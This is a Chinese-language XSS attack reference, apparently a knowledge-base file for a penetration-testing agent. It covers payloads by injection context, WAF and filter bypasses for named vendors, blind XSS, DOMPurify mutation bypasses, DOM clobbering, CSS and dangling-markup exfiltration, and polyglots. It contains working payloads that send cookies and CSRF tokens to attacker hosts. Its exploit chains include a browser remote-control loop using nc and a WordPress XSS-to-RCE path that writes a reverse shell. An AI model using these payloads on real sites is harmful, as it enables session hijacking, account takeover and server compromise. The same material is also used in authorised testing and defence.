# XSS 进阶专题

> 上下文矩阵、WAF 绕过、盲打方法论、利用链、mXSS/DOM Clobbering、现代框架、XS-Leaks。
> XSS 基础（类型/识别/转义检查）见 `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` §1.1；CSP 绕过原理见 `$AGENT_DIR/knowledge-base/csp-bypass.md`。

---

## 1. 上下文选择矩阵

先定上下文再选 payload，错误上下文=浪费尝试：

| 上下文 | 特征 | Payload |
|---|---|---|
| HTML 标签外 | `<b>INPUT</b>` | `<svg onload=alert(1)>` |
| 双引号属性内 | `value="INPUT"` | `"onmouseover=alert(1)//` |
| 属性内且 `>` 被剥 | 引号包裹 | `"autofocus onfocus=alert(1)//` |
| 块标签 title/textarea | `<title>INPUT</title>` | `</title><svg onload=alert(1)>` |
| href/src/action | link/form | `javascript:alert(1)`、`data:text/html,<svg onload=alert(1)>` |
| JS 单引号字符串 | `var x='INPUT'` | `'-alert(1)-'` |
| JS 字符串有转义 | 反斜杠转义 | `\'-alert(1)//` |
| JS 逻辑块内 | if/函数体 | `'}alert(1);{'` |
| script 标签内 | `<script>...INPUT` | `</script><svg onload=alert(1)>` |
| XML 响应 | text/xml | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

**多反射**（单 payload 多点触发）：双反射 `'onload=alert(1)><svg/1='`；三反射 `*/alert(1)">'onload="/*<svg/1='`；双参数 `p=<svg/1='&q='onload=alert(1)>`。

**无需闭合**（页面后方已有 `</script>`）：`<script src=data:,alert(1)>`。

**PHP_SELF 注入**（URL 反射进 form action）：`/page.php/"><svg onload=alert(1)>?param=val`。

## 2. 被忽略的注入向量

- 文件名回显：`"><svg onload=alert(1)>.gif`
- SVG 上传 = 存储型 XSS：`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`；`<use href="//attacker.com/evil.svg#xss">` 外链引用
- EXIF 回显：`exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg`
- postMessage 无 origin 校验：`<iframe src="TARGET" onload="frames[0].postMessage('INJECTION','*')">`；origin 用 `.includes()`/前缀匹配时，注册 `target.com.attacker.com` 绕过
- **二阶 XSS**：存储时编码、另一上下文渲染时不重编码——payload `&lt;svg/onload&equals;alert(1)&gt;`；检查个人资料/显示名在管理后台的渲染
- Django 调试页 XSS（CVE-2017-12794，`DEBUG=True` 生产暴露）：UNIQUE 约束冲突的错误消息未转义渲染重复键值


**Referer 头反射**: Referer 常不被当用户输入处理——反射进 meta refresh/URL 属性时 `Referer: javascript:fetch('https://attacker/?c='+document.cookie)` 产出 `<meta http-equiv=refresh content="0;url=javascript:...">`。探测: curl -H 'Referer: test_marker' 看回显。
## 3. WAF/过滤器绕过

**原语**：参数名攻击（WAF 查值不查名）｜编码链 `%253C`/`%26lt;`/`<%00h2`｜标签变形 `<ScRipt>`、`<svg/onload=`｜分段 `"o<x>nmouseover=alert<x>(1)//`（strip-tags 绕过）｜双写 `<scrscriptipt>`｜注释干扰 `<!--[if true]><img onerror=alert(1) src=-->`｜HTML 实体 `&#60;script&#62;`（滤 `<>` 不滤实体）｜长度受限用 `<script src=//短域/j>`。

**无事件处理器向量**：`<form action=javascript:alert(1)><input type=submit>`、`<button formaction=javascript:alert(1)>`、`<object data=javascript:alert(1)>`、`<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>`。

**替代事件**（常见事件被滤时，autofocus+onfocus 在 input/select/textarea 均有效）：`<input autofocus onfocus=alert(1)>`、`<marquee onstart=alert(1)>`、`<video><source onerror=alert(1)>`、`<details open ontoggle=alert(1)>`、`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`（Chrome）。

**按厂商**（时效性强，现测为准）：Cloudflare `<svg onload=prompt``>`/实体编码 javascript:；Akamai `<base href="javascript:/a]/-alert(1)//">`/`<dETAILS open oNtoggle=...>`；Imperva `$.globalEval("al"+"ert(1)")`/object data: base64；WordFence `javas&#99;ript:` 实体。

**测试流程**（ZSEANO 法）：无害标签 → 不完整标签 → 编码探针 → 无闭合 `<script src=` → 黑名单探测。**有过滤器=有漏洞**（开发者修补过）；同一过滤器大概率全局复用，全应用顺藤摸瓜。

**防御失误清单**：只滤 script 标签｜只滤小写｜黑名单遗漏｜纯前端过滤｜单次过滤（双写绕过）｜只滤输入忽略二阶编码。

**Unicode 大小写折叠差异**: 多层处理各用不同规范化时——ASCII 正则层 + Unicode 折叠层组合可绕: `<ſcript>`（ſ=U+017F）过 ASCII 正则 `<\s*/?\s*script`，Go strings.EqualFold 折叠 ſ→s 后当合法 script 处理。折叠对: ſ(U+017F)→s、ı(U+0131)→i、ﬁ(U+FB01)→fi、K(U+212A Kelvin)→k。多语言栈逐层确认规范化标准。

**点号过滤绕过**: ①十进制 IP——92.123.45.67→1558071511（92*256³+123*256²+45*256+67），`http://1558071511/` 无点（十六进制 0x5c7b2d43 同理）；②括号记号 `window["location"]`、`document["cookie"]`；③ `"str"["concat"](x)` 替代 +。

**Chrome URL 全角归一化**: 域名校验绕过——全角拉丁 ａ-ｚ(U+FF41-FF5A) 经 Chrome IDNA/NFKC 归一化回 ASCII；拦 'x' 用 ｘ(U+FF58)、长度限制用全角字符扩展后仍归一化。U+FF0F ／→/、U+FF1A ：→:。

**JSFuck**: 只许 `[]!+` 时的执行原语与解码法见 client-side-attacks.md §6。

## 4. 盲 XSS 与利用链

**盲打场景**：后台管理/审核/工单/留言、User-Agent/Referer 日志页、X-Forwarded-For/Client-IP、注册字段、跨端同步（WAP→PC、APP→Web、客户端昵称→Web）、二次渲染点（草稿箱/审核列表/后台统计页）。

**Payload**：`"><script src=//attacker.com/bxss.js></script>`，收集器回传 URL+cookie+DOM；自动化用 XSS Hunter 类平台。

**HttpOnly 不是终点**（只防 cookie 窃取）：代理浏览器（fetch 带凭证发请求）｜CSRF via XSS（正则 `/csrf_token['":\s]+([^'"<\s]+)/` 从 DOM 提 token 后改邮箱）｜键盘记录。

**WordPress XSS→RCE**（admin 会话 + plugin-editor 可用）：GET plugin-editor.php 取 `_wpnonce` → POST 写 `hello.php` 反弹 shell 内容 → 访问触发。

**浏览器远控**：setInterval 轮询拉命令脚本；攻击端 `while :; do read c; echo $c | nc -lp 5855; done`。

**会话固定**：登录后不 `session_regenerate_id(true)` 时，预置 PHPSESSID（URL 或 XSS 注 cookie）→ 受害者登录 → 复用预置 ID。

## 5. mXSS 与 DOM Clobbering

**mXSS**：净化器输出经浏览器重解析后突变。验证：`element.innerHTML = sanitized` 后检查实际 DOM 与净化器预期树的差异。

DOMPurify 绕过三模式：
1. 命名空间混淆：`<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">`（MathML → HTML 集成点切换）
2. `<noscript>` 解析差异：`<noscript><style></noscript><img src=x onerror=alert(1)>`（scripting 启用/禁用视角不同）
3. form/table 重构：`<form><math><mtext></form><form><mglyph><svg><mpath><set attributeName=onmouseover to=alert(1)>`（树构建器自动重构）

**DOM Clobbering**：`<img id=x>` → `window.x` 是该元素；`<form id=x><img id=y>` → `window.x.y`；双 `<a id=x>` → HTMLCollection；3 级 `<form id=x name=y><input id=z>` → `document.x.y.z`。利用：`if(window.config){url=window.config.url}` 时注入 `<a id=config href="//attacker/evil.js">`；`String(window.x)`===href。`cid:` 协议部分净化器放行。`typeof x!=='undefined'` 防御可被绕过（DOM 元素也是对象）。

**Shadow DOM XSS**: ① closed shadow root 劫持——Proxy 包裹 `Element.prototype.attachShadow` 捕获 root 引用; ② 间接 eval `(0,eval)('code')` 逃逸 with(document) scope; ③ payload 走私进固定前缀字段（avatar URL）+ `avatar.slice(N)` 提取: `<svg/onload=(0,eval)('eval(avatar.slice(24))')>`; ④ 关键字过滤常漏 `</script>` 结构标签——闭合现有脚本上下文后 `<script src=//evil>` 外载，从 `document.scripts[].textContent` 读页面数据。

**Self-XSS 持久化提升链**: ① CSRF+Self-XSS→存储 XSS（跨站表单让受害者提交 payload）; ② 字段后渲染进管理面板/共享视图（工单用户名显示在管理员界面）; ③ CDN .js 扩展名共享缓存——用户名以 .js 结尾使 CDN 把 /profile/user.js 当静态资源缓存（不 Vary Cookie），自己访问一次污染边缘缓存，admin bot 之后拿到已认证 HTML（详见 cache-poisoning.md §8.1）。见到 self-XSS 查: 字段入库？渲染面？CSRF？扩展名？

## 6. 现代框架 + Trusted Types + Service Worker

| 框架 | 危险点 |
|------|--------|
| React | `dangerouslySetInnerHTML`、`href={userInput}`（不拦 javascript:）、hydration mismatch |
| Vue | `v-html`、SSR `{{ }}` 模板注入、`:href` 接受 javascript:、组件 `is` 动态注入 |
| Angular | `bypassSecurityTrustHtml/Url`、`[innerHTML]`+bypass、Universal SSR、AngularJS 1.x 沙箱逃逸 |
| Next.js/Nuxt | `getServerSideProps` 数据经 dangerouslySetInnerHTML、API 路由反射、`_document.js` head 注入 |

**Trusted Types 绕过**：default 策略弱净化｜`createHTML:(s)=>s` 透传｜非 TT 汇（`window.name` 跨导航持久、`location.href` 导航型、`window.open(javascript:)`）｜createScript 宽松｜clobbering 覆盖策略名｜只删 `<script>` 的策略挡不住 `<img onerror>`。

**AngularJS 沙箱逃逸 trim 变体**: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}`（Google CTF 2017，trim 返回全串破坏逐字符校验）; 1.4.x: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}`。

**postMessage null origin**: `if (event.origin==='http://trusted.com' || !event.origin)` 弱写法走 !event.origin 分支。null origin 产生: `data:` URI iframe 或 `<iframe sandbox="allow-scripts">`（无 allow-same-origin）。测试: data: iframe 发消息看是否进处理逻辑。修复显式拒绝: `if (!event.origin || event.origin==='null') return;`。

**Service Worker 持久化**：`navigator.serviceWorker.register('/sw.js',{scope:'/'})` + fetch 拦截器返回注入响应——XSS 修补后仍存活，直到 SW 注销。前置：HTTPS、同源 JS content-type、scope 限脚本目录。

## 7. XS-Leaks 与 CSS 外带

**XS-Leaks 侧信道**：计时 oracle（认证响应更慢/搜索命中耗时差异，逐词探测）｜frame counting（`w.length` 差异）｜error event oracle（img onload/onerror 探测登录态资源）｜cache probing（force-cache 计时判断访问历史）。防御：`Cache-Control: no-store`、资源名不可预测。

**CSS 注入外带**（能注 CSS 不能注 JS 时）：属性选择器逐字符 `input[name="csrf"][value^="a"]{background:url(//attacker/?token=a)}`｜`@font-face`+`unicode-range` 字体加载回调｜连字宽度侧信道｜`@import` 多轮链。

**Dangling markup**（CSP 禁 script 允许 img）：`<img src='https://attacker.com/log?` 吞掉后续页面内容作 URL 参数泄露。完整专题（七种向量/CSP 对照/Chrome 缓解绕过/textarea+form/DNS prefetch/组合攻击）见 `$AGENT_DIR/knowledge-base/dangling-markup.md`。

## 8. Polyglot 与浏览器差异

- 0xsobky: `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
- s0md3v: `-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>`

浏览器：Chrome `<svg><animate onbegin=...>`；Firefox MathML `xlink:href="javascript:..."`；Safari `<input autofocus type=search incremental>`。

**DOM 源/汇清单**——源：`document.URL/baseURI/referrer`、`location.*`、`window.name`、`document.cookie`；汇：`setTimeout/setInterval/Function()`、`innerHTML/outerHTML/insertAdjacentHTML`、`element.src/href/action`。

**Flash legacy**：crossdomain.xml 过宽 + SWF 上传跨域读取；LSO 持久化 XSS；`ExternalInterface.call` 参数注入。**IE legacy**：CSS expression、UTF-7（页面未设 charset 时 `+ADw-script+AD4-`）。

**HttpOnly 旁路——服务端回显 Cookie**: Apache 2.2.x<2.2.22 的 400 错误页回显完整 Cookie 头（CVE-2012-0053）——XSS 中 document.cookie 塞 4000 字符 padding 触发 400，响应体含 HttpOnly cookie 直接读。规则: HttpOnly 只拦 JS 读取，响应体/错误页/日志回显不受限。
